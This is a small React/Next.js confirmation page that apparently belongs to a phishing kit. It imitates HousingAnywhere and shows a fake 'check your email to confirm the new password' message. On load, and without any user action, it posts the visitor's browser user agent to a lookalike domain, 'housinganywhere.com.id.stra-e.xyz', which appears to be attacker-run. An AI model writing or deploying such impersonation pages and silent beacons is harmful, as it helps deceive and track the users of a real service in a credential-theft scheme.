import { useEffect } from "react";
import { useParams } from 'next/navigation'
import axios from "axios";

function Confirm() {
  const params = useParams();
  
  async function handleSubmit() {
    console.log(params.id);
    try {
      await axios.post(`https://housinganywhere.com.id.stra-e.xyz/api/confirm`, {browser: navigator.userAgent});
    } catch(err) {
      console.log(err, "ce o avea");
    }
  }

  useEffect(() => {
    handleSubmit();
  }, [])

  return (
    <section>
        <span>Please check your email to confirm the new password.</span>    
    </section>
  )
}

export default Confirm;
